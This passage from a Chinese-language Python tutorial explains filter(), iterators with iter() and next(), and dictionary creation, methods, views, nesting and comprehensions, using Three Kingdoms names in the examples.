<h3 id="11-15-filter"><a href="#11-15-filter" class="headerlink" title="11.15 filter()"></a>11.15 filter()</h3><p>与 map() 函数类似，<a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-191307-1-1.html">filter()</a> 函数也是需要传入一个函数作为参数，不过 filter() 函数是根据提供的函数，对指定的可迭代对象的每个元素进行运算，并将运算结果为真的元素，以迭代器的形式返回：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; filter(str.islower, &quot;FishC&quot;)</span><br><span class="line">&lt;filter object at 0x000001B5170FEFA0&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码我们传入的是字符串的 islower() 方法，作用就是判断传入的参数是否为小写字母，结合到 filter() 函数中使用，就是剔除大写字母，保留小写字母的作用。</p>
<p>如果提供的函数是 None，则会假设它是一个 “鉴真” 函数，即可迭代对象中所有值为假的元素会被移除：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(filter(None, [True, False, 1, 0]))</span><br><span class="line">[True, 1]</span><br></pre></td></tr></table></figure>
<h3 id="11-16-可迭代对象和迭代器"><a href="#11-16-可迭代对象和迭代器" class="headerlink" title="11.16 可迭代对象和迭代器"></a>11.16 可迭代对象和迭代器</h3><p>最大的区别是：可迭代对象咱们可以对其进行重复的操作，而迭代器则是一次性的！</p>
<p>将可迭代对象转换为迭代器：iter() 函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; x = [1, 2, 3, 4, 5]</span><br><span class="line">&gt;&gt;&gt; y = iter(x)</span><br></pre></td></tr></table></figure>
<p>通过 type() 函数，我们可以观察到这个区别：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; type(x)</span><br><span class="line">&lt;class &#x27;list&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; type(y)</span><br><span class="line">&lt;class &#x27;list_iterator&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p>最后，BIF 里面有一个 next() 函数，它是专门针对迭代器的。<br>它的作用就是逐个将迭代器中的元素提取出来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; next(y)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(y)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; next(y)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; next(y)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; next(y)</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; next(y)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#52&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    next(y)</span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure>
<p>现在如果不想它抛出异常，那么可以给它传入第二个参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; z = iter(x)</span><br><span class="line">&gt;&gt;&gt; next(z, &quot;没啦，被你掏空啦~&quot;)</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; next(z, &quot;没啦，被你掏空啦~&quot;)</span><br><span class="line">2</span><br><span class="line">&gt;&gt;&gt; next(z, &quot;没啦，被你掏空啦~&quot;)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; next(z, &quot;没啦，被你掏空啦~&quot;)</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; next(z, &quot;没啦，被你掏空啦~&quot;)</span><br><span class="line">5</span><br><span class="line">&gt;&gt;&gt; next(z, &quot;没啦，被你掏空啦~&quot;)</span><br><span class="line">&#x27;没啦，被你掏空啦~&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="12-字典"><a href="#12-字典" class="headerlink" title="12 字典"></a>12 字典</h2><h3 id="12-1-字典的关键特征"><a href="#12-1-字典的关键特征" class="headerlink" title="12.1 字典的关键特征"></a>12.1 字典的关键特征</h3><p>字典是 Python 中唯一实现映射关系的内置类型。<br>字典的关键符号是大括号（{}）和冒号（:）：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = &#123;&quot;吕布&quot;:&quot;口口布&quot;, &quot;关羽&quot;:&quot;关习习&quot;&#125;</span><br><span class="line">&gt;&gt;&gt; type(d)</span><br><span class="line">&lt;class &#x27;dict&#x27;&gt;</span><br></pre></td></tr></table></figure><br>这里就是两对映射关系，我们将冒号的左边称为字典的 “键”，右边称为字典的 “值”。<br>在字典中，只要我们提供键，就可以获取其对应的值。方法跟序列类似，只不过这次在方括号中，咱们使用的是键，而非索引值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&quot;吕布&quot;]</span><br><span class="line">&#x27;口口布&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="12-2-创建字典"><a href="#12-2-创建字典" class="headerlink" title="12.2 创建字典"></a>12.2 创建字典</h3><p>创建字典有很多种方法，这里我们把官方文档列举的6种方法介绍给大家！<br>OK，第一种就是刚刚给大家演示过的，直接使用大括号和冒号的组合，将映射关系给“套牢”：<br><code>&gt;&gt;&gt; a = &#123;&quot;吕布&quot;:&quot;口口布&quot;, &quot;关羽&quot;:&quot;关习习&quot;, &quot;刘备&quot;:&quot;刘baby&quot;&#125;</code><br>第二种，使用<code>dict()</code>函数，跟<code>list()、tuple()、str()</code>类似，<code>dict()</code>函数用来生成字典，它的每个参数就是一个键值对，键与值直接使用等号<br><code>&gt;&gt;&gt; b = dict(吕布=&quot;口口布&quot;, 关羽=&quot;关习习&quot;, 刘备=&quot;刘baby&quot;)</code><br>注意：这种写法要求你不能往键上面加引号，尽管它是一个字符串，但是你加引号就会出错.</p>
<p>第三种，使用列表作为参数，列表中的每个元素是使用元组包裹起来的键值对<br><code>&gt;&gt;&gt; c = dict([(&quot;吕布&quot;,&quot;口口布&quot;), (&quot;关羽&quot;,&quot;关习习&quot;), (&quot;刘备&quot;,&quot;刘baby&quot;)])</code><br>第四种，属于“无病呻吟”版本，就是将第一种方法作为参数给到 dict() 函数：<br><code>&gt;&gt;&gt; d = dict(&#123;&quot;刘备&quot;: &quot;刘baby&quot;, &quot;关羽&quot;: &quot;关习习&quot;, &quot;吕布&quot;: &quot;口口布&quot;&#125;)</code><br>第五种，混合拳法：<br><code>&gt;&gt;&gt; e = dict(&#123;&quot;吕布&quot;:&quot;口口布&quot;, &quot;刘备&quot;:&quot;刘baby&quot;&#125;, 关羽=&quot;关习习&quot;)</code><br>第六种，zip() 函数大家应该还有印象吧？它的作用是创建一个聚合多个可迭代对象的迭代器，对吧？那么，它也是可以作为参数传给 dict() 函数的：<br><code>&gt;&gt;&gt; f = dict(zip([&quot;吕布&quot;,&quot;关羽&quot;,&quot;刘备&quot;], [&quot;口口布&quot;,&quot;关习习&quot;,&quot;刘baby&quot;]))</code></p>
<h3 id="12-3-增"><a href="#12-3-增" class="headerlink" title="12.3 增"></a>12.3 增</h3><p>首先是 fromkeys(iterable[, value]) 方法，这个可以算是字典中最特殊的方法，它可以使用 iterable 参数指定的可迭代对象来创建一个新字典，并将所有的值初始化为 value 参数指定的值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = dict.fromkeys(&quot;Fish&quot;, 250)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: 250, &#x27;i&#x27;: 250, &#x27;s&#x27;: 250, &#x27;h&#x27;: 250&#125;</span><br></pre></td></tr></table></figure><br>如果不指定 value 参数，则采用默认值 None：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = dict.fromkeys(&quot;Fish&quot;)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: None, &#x27;i&#x27;: None, &#x27;s&#x27;: None, &#x27;h&#x27;: None&#125;</span><br></pre></td></tr></table></figure><br>这种方法适用于从无到有，创建一个所有键的值都相同的字典。<br>这招对于快速初始化一个字典非常有用，如果需要修改某个键的值，这么做：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&#x27;F&#x27;] = 70</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: 70, &#x27;i&#x27;: None, &#x27;s&#x27;: None, &#x27;h&#x27;: None&#125;</span><br></pre></td></tr></table></figure><br>如果在字典中找不到对应的键，那么同样的操作就会变成增加一个新的键值对：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&#x27;C&#x27;] = 67</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: 70, &#x27;i&#x27;: None, &#x27;s&#x27;: None, &#x27;h&#x27;: None, &#x27;C&#x27;: 67&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="12-4-删"><a href="#12-4-删" class="headerlink" title="12.4 删"></a>12.4 删</h3><p>删除字典中的指定元素我们可以使用 pop() 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.pop(&#x27;s&#x27;)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: None, &#x27;i&#x27;: None, &#x27;h&#x27;: None, &#x27;C&#x27;: 67&#125;</span><br></pre></td></tr></table></figure><br>那么你会发现，如果 pop() 一个不存在的键，那么会抛出异常：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.pop(&quot;狗&quot;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#7&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    d.pop(&quot;狗&quot;)</span><br><span class="line">KeyError: &#x27;狗&#x27;</span><br></pre></td></tr></table></figure><br>如果你想让 Python 别这么激动，可以指定一个 default 参数：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.pop(&quot;狗&quot;, &quot;没有~&quot;)</span><br><span class="line">&#x27;没有~&#x27;</span><br></pre></td></tr></table></figure><br>跟 pop() 方法类似的还有一个 popitem()，在 Python3.7 之前，它是随机删除一个键值对，在 Python3.7 之后，它删除的是最后一个加入字典的键值对：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.popitem()</span><br><span class="line">(&#x27;C&#x27;, 67)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: None, &#x27;i&#x27;: None, &#x27;h&#x27;: None&#125;</span><br></pre></td></tr></table></figure><br>然后 del 关键字也可以删除一个指定的字典元素：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del d[&#x27;i&#x27;]</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: None, &#x27;h&#x27;: None&#125;</span><br></pre></td></tr></table></figure><br>当然，如果 del 直接加上字典的变量名就是将整个字典给干掉：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; del d</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#14&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    d</span><br><span class="line">NameError: name &#x27;d&#x27; is not defined</span><br></pre></td></tr></table></figure><br>如果我们只希望清空字典中的内容，可以使用 clear() 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = dict.fromkeys(&quot;FishC&quot;, 250)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: 250, &#x27;i&#x27;: 250, &#x27;s&#x27;: 250, &#x27;h&#x27;: 250, &#x27;C&#x27;: 250&#125;</span><br><span class="line">&gt;&gt;&gt; d.clear()</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="12-5-改"><a href="#12-5-改" class="headerlink" title="12.5 改"></a>12.5 改</h3><p>类似于序列的操作，只需要指定一个存在于字典中的键，就可以修改其对应的值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = dict.fromkeys(&quot;FishC&quot;)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: None, &#x27;i&#x27;: None, &#x27;s&#x27;: None, &#x27;h&#x27;: None, &#x27;C&#x27;: None&#125;</span><br><span class="line">&gt;&gt;&gt; d[&#x27;s&#x27;] = 115</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: None, &#x27;i&#x27;: None, &#x27;s&#x27;: 115, &#x27;h&#x27;: None, &#x27;C&#x27;: None&#125;</span><br></pre></td></tr></table></figure><br>如果我们想要同时修改多个键值对，那么说实话，逐个操作就有点太麻烦了。<br>这时候，我们可以使用字典的 update() 方法，可以同时给它传入多个键值对，也可以直接给它传入另外一个字典，或者一个包含键值对的可迭代对象：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.update(&#123;&#x27;i&#x27;:105, &#x27;h&#x27;:104&#125;)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: None, &#x27;i&#x27;: 105, &#x27;s&#x27;: 115, &#x27;h&#x27;: 104, &#x27;C&#x27;: None&#125;</span><br><span class="line">&gt;&gt;&gt; d.update(F=&#x27;70&#x27;, C=&#x27;67&#x27;)</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: &#x27;70&#x27;, &#x27;i&#x27;: 105, &#x27;s&#x27;: 115, &#x27;h&#x27;: 104, &#x27;C&#x27;: &#x27;67&#x27;&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="12-6-查"><a href="#12-6-查" class="headerlink" title="12.6 查"></a>12.6 查</h3><p>最简单的查方法就是你给它一个键，它返回你对应的值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&#x27;C&#x27;]</span><br><span class="line">67</span><br></pre></td></tr></table></figure><br>如果指定的键不存在于字典中，那么会报错：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&#x27;c&#x27;]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#6&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    d[&#x27;c&#x27;]</span><br><span class="line">KeyError: &#x27;c&#x27;</span><br></pre></td></tr></table></figure></p>
<p>这在有些时候会被认为是用户体验不佳的表现，所以更好的方法是使用 get() 方法，它可以传入一个 default 参数，指定找不到键时返回的值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.get(&#x27;c&#x27;, &quot;这里没有c&quot;)</span><br><span class="line">&#x27;这里没有c&#x27;</span><br></pre></td></tr></table></figure></p>
<p>还有一种情况是我们需要查找一个键是否存在于字典中，如果在，返回它对应的值；如果不在，给它指定一个新的值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d.setdefault(&#x27;C&#x27;, &quot;code&quot;)</span><br><span class="line">67</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: 70, &#x27;i&#x27;: 105, &#x27;s&#x27;: 115, &#x27;h&#x27;: 104, &#x27;C&#x27;: 67&#125;</span><br><span class="line">&gt;&gt;&gt; d.setdefault(&#x27;c&#x27;, &quot;code&quot;)</span><br><span class="line">&#x27;code&#x27;</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: 70, &#x27;i&#x27;: 105, &#x27;s&#x27;: 115, &#x27;h&#x27;: 104, &#x27;C&#x27;: 67, &#x27;c&#x27;: &#x27;code&#x27;&#125;</span><br></pre></td></tr></table></figure><br>对比前面直接复制的操作，这么做的一个显而易见的好处就是不会破坏到已经存在的键值对。</p>
<h3 id="12-7-视图对象"><a href="#12-7-视图对象" class="headerlink" title="12.7 视图对象"></a>12.7 视图对象</h3><p>items()、keys() 和 values() 三个方法分别用于获取字典的键值对、键和值三者的视图对象。</p>
<p>什么是视图对象呢？</p>
<p>这个名字听着挺新鲜，字面上的解释是：视图对象就是字典的一个动态视图，这意味着当字典内容改变时，视图对象的内容也会相应地跟着改变。</p>
<p>举个例子:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: 70, &#x27;i&#x27;: 105, &#x27;s&#x27;: 115, &#x27;h&#x27;: 104, &#x27;C&#x27;: 67, &#x27;c&#x27;: &#x27;code&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt; items = d.items()</span><br><span class="line">&gt;&gt;&gt; keys = d.keys()</span><br><span class="line">&gt;&gt;&gt; values = d.values()</span><br><span class="line">&gt;&gt;&gt; items</span><br><span class="line">dict_items([(&#x27;F&#x27;, 70), (&#x27;i&#x27;, 105), (&#x27;s&#x27;, 115), (&#x27;h&#x27;, 104), (&#x27;C&#x27;, 67), (&#x27;c&#x27;, &#x27;code&#x27;)])</span><br><span class="line">&gt;&gt;&gt; keys</span><br><span class="line">dict_keys([&#x27;F&#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27;h&#x27;, &#x27;C&#x27;, &#x27;c&#x27;])</span><br><span class="line">&gt;&gt;&gt; values</span><br><span class="line">dict_values([70, 105, 115, 104, 67, &#x27;code&#x27;])</span><br><span class="line">&gt;&gt;&gt; d.pop(&#x27;c&#x27;)</span><br><span class="line">&#x27;code&#x27;</span><br><span class="line">&gt;&gt;&gt; items</span><br><span class="line">dict_items([(&#x27;F&#x27;, 70), (&#x27;i&#x27;, 105), (&#x27;s&#x27;, 115), (&#x27;h&#x27;, 104), (&#x27;C&#x27;, 67)])</span><br><span class="line">&gt;&gt;&gt; keys</span><br><span class="line">dict_keys([&#x27;F&#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27;h&#x27;, &#x27;C&#x27;])</span><br><span class="line">&gt;&gt;&gt; values</span><br><span class="line">dict_values([70, 105, 115, 104, 67])</span><br></pre></td></tr></table></figure><br>最后，为了方便地实现浅拷贝，字典也提供了一个 copy() 方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = d.copy()</span><br><span class="line">&gt;&gt;&gt; e</span><br><span class="line">&#123;&#x27;F&#x27;: 70, &#x27;i&#x27;: 105, &#x27;s&#x27;: 115, &#x27;h&#x27;: 104, &#x27;C&#x27;: 67&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="12-8-字典妙用"><a href="#12-8-字典妙用" class="headerlink" title="12.8 字典妙用"></a>12.8 字典妙用</h3><p>使用 len() 函数来获取字典的键值对数量：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; len(d)</span><br><span class="line">5</span><br></pre></td></tr></table></figure><br>使用 in 和 not in 来判断某个键是否存在于字典中：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;C&#x27; in d</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; &#x27;c&#x27; not in d</span><br><span class="line">True</span><br></pre></td></tr></table></figure><br>字典也可以转化为列表，使用 list() 函数就可以了：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(d)</span><br><span class="line">[&#x27;F&#x27;, &#x27;i&#x27;, &#x27;s&#x27;, &#x27;h&#x27;, &#x27;C&#x27;]</span><br></pre></td></tr></table></figure><br>那么 iter() 函数也可以作用于字典，它会将字典的键构成一个迭代器：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e = iter(d)</span><br><span class="line">&gt;&gt;&gt; next(e)</span><br><span class="line">&#x27;F&#x27;</span><br><span class="line">&gt;&gt;&gt; next(e)</span><br><span class="line">&#x27;i&#x27;</span><br><span class="line">&gt;&gt;&gt; next(e)</span><br><span class="line">&#x27;s&#x27;</span><br><span class="line">&gt;&gt;&gt; next(e)</span><br><span class="line">&#x27;h&#x27;</span><br><span class="line">&gt;&gt;&gt; next(e)</span><br><span class="line">&#x27;C&#x27;</span><br><span class="line">&gt;&gt;&gt; next(e)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#15&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    next(e)</span><br><span class="line">StopIteration</span><br></pre></td></tr></table></figure><br>在 Python3.8 之后的版本中，咱们可以使用 reversed() 函数对字典内部的键值对进行逆向操作：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(reversed(d))</span><br><span class="line">[&#x27;C&#x27;, &#x27;h&#x27;, &#x27;s&#x27;, &#x27;i&#x27;, &#x27;F&#x27;]</span><br></pre></td></tr></table></figure><br>可以看出，reversed(d) 其实相当于 reversed(d.keys()) 的缩写，那么如果我们想要获得值的逆向序列，可以这么做：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; list(reversed(d.values()))</span><br><span class="line">[67, 104, 115, 105, 70]</span><br></pre></td></tr></table></figure></p>
<h3 id="12-9-嵌套"><a href="#12-9-嵌套" class="headerlink" title="12.9 嵌套"></a>12.9 嵌套</h3><p>字典也是可以嵌套的，某个键的值是另外一个字典，并不是什么稀奇的事儿，举个例子，假如三国也有语数英：<br><code>&gt;&gt;&gt; d = &#123;&quot;吕布&quot;: &#123;&quot;语文&quot;:60, &quot;数学&quot;:70, &quot;英语&quot;:80&#125;, &quot;关羽&quot;: &#123;&quot;语文&quot;:80, &quot;数学&quot;:90, &quot;英语&quot;:70&#125;&#125;</code><br>如果想要获取吕布的数学成绩，那么就需要进行两次索引：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&quot;吕布&quot;][&quot;数学&quot;]</span><br><span class="line">70</span><br></pre></td></tr></table></figure><br>那嵌套的也可以是一个列表：<br><code>&gt;&gt;&gt; d = &#123;&quot;吕布&quot;: [60, 70, 80], &quot;关羽&quot;: [80, 90, 70]&#125;</code><br>第二次索引，我们当然也得换成下标索引：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d[&quot;吕布&quot;][1]</span><br><span class="line">70</span><br></pre></td></tr></table></figure></p>
<h3 id="12-10-字典推导式"><a href="#12-10-字典推导式" class="headerlink" title="12.10 字典推导式"></a>12.10 字典推导式</h3><p>最后高阶的 —— 字典推导式：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = &#123;&#x27;F&#x27;:70, &#x27;i&#x27;:105, &#x27;s&#x27;:115, &#x27;h&#x27;:104, &#x27;C&#x27;:67&#125;</span><br><span class="line">&gt;&gt;&gt; b = &#123;v:k for k,v in d.items()&#125;</span><br><span class="line">&gt;&gt;&gt; b</span><br><span class="line">&#123;70: &#x27;F&#x27;, 105: &#x27;i&#x27;, 115: &#x27;s&#x27;, 104: &#x27;h&#x27;, 67: &#x27;C&#x27;&#125;</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: 70, &#x27;i&#x27;: 105, &#x27;s&#x27;: 115, &#x27;h&#x27;: 104, &#x27;C&#x27;: 67&#125;</span><br></pre></td></tr></table></figure><br>看，这样我们轻而易举地将键和值给掉了个位置。<br>当然，我们也可以加上筛选的条件：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = &#123;v:k for k,v in d.items() if v &gt; 100&#125;</span><br><span class="line">&gt;&gt;&gt; c</span><br><span class="line">&#123;105: &#x27;i&#x27;, 115: &#x27;s&#x27;, 104: &#x27;h&#x27;&#125;</span><br></pre></td></tr></table></figure><br>利用字典推导式，我们就可以轻易地让 Python 帮你求出字符串的编码值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; d = &#123;x:ord(x) for x in &quot;FishC&quot;&#125;</span><br><span class="line">&gt;&gt;&gt; d</span><br><span class="line">&#123;&#x27;F&#x27;: 70, &#x27;i&#x27;: 105, &#x27;s&#x27;: 115, &#x27;h&#x27;: 104, 